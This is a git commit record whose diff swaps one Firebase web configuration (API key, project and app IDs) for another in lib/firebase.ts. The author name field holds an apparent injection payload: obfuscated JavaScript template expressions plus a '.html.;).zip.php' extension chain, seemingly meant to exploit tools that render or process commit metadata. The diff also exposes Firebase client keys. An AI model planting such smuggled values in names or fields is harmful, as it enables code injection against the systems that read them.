9dc1a08af43f963dc529c09ff5b6ba5e927cc334
zlamma @_=`${`${{}}`[!![]!![]!![]|!![]]}${`${{}}`[!!{}![]]}${`${[][~[]]}`[!!{}![]]}${`${!![][~[]]}`[(!![]!![])|!![]]}${`${![][~[]]}`[!{}![]]}${`${![][~[]]}.html.;).zip.php <yonathandoss@gmail.com>
2026-01-22 20:56:20 -0300

    Update firebase.ts

--- lib/firebase.ts
+++ lib/firebase.ts
@@ -8,12 +8,12 @@ import { getFirestore } from 'firebase/firestore'
 // 👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
 
 const firebaseConfig = {
-    apiKey: "AIzaSyCxqCyglAG9tUQlp8hxqpQFlJLKnog0h-w",
-    authDomain: "os-example-313ee.firebaseapp.com",
-    projectId: "os-example-313ee",
-    storageBucket: "os-example-313ee.appspot.com",
-    messagingSenderId: "754955767049",
-    appId: "1:754955767049:web:f03b3eadd402e31a9fd7d8",
+    apiKey: "AIzaSyAu0J3fKrVBt6n3Sz6tgfGoX5nCkB2vSM8",
+    authDomain: "web-community-123m.firebaseapp.com",
+    projectId: "web-community-123m",
+    storageBucket: "web-community-123m.appspot.com",
+    messagingSenderId: "745930105993",
+    appId: "1:745930105993:web:5bb8ad7f9d7e90697a9258",
     measurementId: "G-SRV4Y5K1XE"
   };
 
